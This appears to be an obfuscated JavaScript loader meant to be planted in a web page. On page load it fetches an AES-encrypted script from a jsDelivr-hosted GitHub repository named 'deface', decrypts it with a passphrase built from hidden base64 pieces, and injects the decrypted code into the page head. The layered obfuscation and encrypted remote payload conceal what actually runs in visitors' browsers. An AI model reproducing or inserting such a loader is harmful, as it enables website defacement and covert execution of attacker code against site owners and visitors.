(() => {

    const obfuscate = (value) =>
        atob(value);

const _0x26b432=_0x4c9c;(function(_0x1d7621,_0x2dc454){const _0x4ef476=_0x4c9c,_0x5b62ac=_0x1d7621();while(!![]){try{const _0x3ece4e=-parseInt(_0x4ef476(0x10c))/0x1*(-parseInt(_0x4ef476(0x11b))/0x2)+-parseInt(_0x4ef476(0x116))/0x3+parseInt(_0x4ef476(0x120))/0x4+parseInt(_0x4ef476(0x10e))/0x5*(-parseInt(_0x4ef476(0x109))/0x6)+parseInt(_0x4ef476(0x115))/0x7+-parseInt(_0x4ef476(0x10d))/0x8*(parseInt(_0x4ef476(0x122))/0x9)+-parseInt(_0x4ef476(0x111))/0xa;if(_0x3ece4e===_0x2dc454)break;else _0x5b62ac['push'](_0x5b62ac['shift']());}catch(_0x52780e){_0x5b62ac['push'](_0x5b62ac['shift']());}}}(_0x1a90,0x386e3));function _0x4c9c(_0x476e18,_0x2151bd){_0x476e18=_0x476e18-0x108;const _0x1a9014=_0x1a90();let _0x4c9c8e=_0x1a9014[_0x476e18];return _0x4c9c8e;}function _0x1a90(){const _0x3202ae=['1058pEMYOe','bWo2bEg5','Unable\x20to\x20load\x20encrypted\x20source.','toString','d3QzY1pM','277064vSQPMr','script','2763324pogDfU','Wrong\x20passphrase.','https://cdn.jsdelivr.net/gh/crybypass/deface/blog-metrics/js/encrypted.js','2226HVeYrV','d0lTcVU=','decrypt','803WtuYbP','8yXsRiW','245QqLQpU','appendChild','SElIeHQ=','484600ISsklh','OElmTHA=','createElement','enc','1333612EFXDzX','239265wpYvzS','Utf8','head','error','text'];_0x1a90=function(){return _0x3202ae;};return _0x1a90();}const part1=obfuscate(_0x26b432(0x11c)),part2=obfuscate(_0x26b432(0x11f)),part3=obfuscate(_0x26b432(0x110)),part4=obfuscate(_0x26b432(0x112)),part5=obfuscate(_0x26b432(0x10a)),part6=obfuscate('aHFQblY='),PASSPHRASE=[part1,part2,part3,part4,part5,part6]['join'](''),loadEncrypted=async()=>{const _0x3b8741=_0x26b432;try{const _0x40a8e2=await fetch(_0x3b8741(0x108),{'cache':'no-store'});if(!_0x40a8e2['ok'])throw new Error(_0x3b8741(0x11d));const _0x31cee1=await _0x40a8e2['text'](),_0xee558b=CryptoJS['AES'][_0x3b8741(0x10b)](_0x31cee1,PASSPHRASE),_0x14e049=_0xee558b[_0x3b8741(0x11e)](CryptoJS[_0x3b8741(0x114)][_0x3b8741(0x117)]);if(!_0x14e049)throw new Error(_0x3b8741(0x123));const _0x49e5b2=document[_0x3b8741(0x113)](_0x3b8741(0x121));_0x49e5b2[_0x3b8741(0x11a)]=_0x14e049,document[_0x3b8741(0x118)][_0x3b8741(0x10f)](_0x49e5b2);}catch(_0x59ad1f){console[_0x3b8741(0x119)](_0x59ad1f);}};

    if (document.readyState === "loading") {

        document.addEventListener(
            "DOMContentLoaded",
            loadEncrypted
        );

    }

    else {

        loadEncrypted();

    }

})();
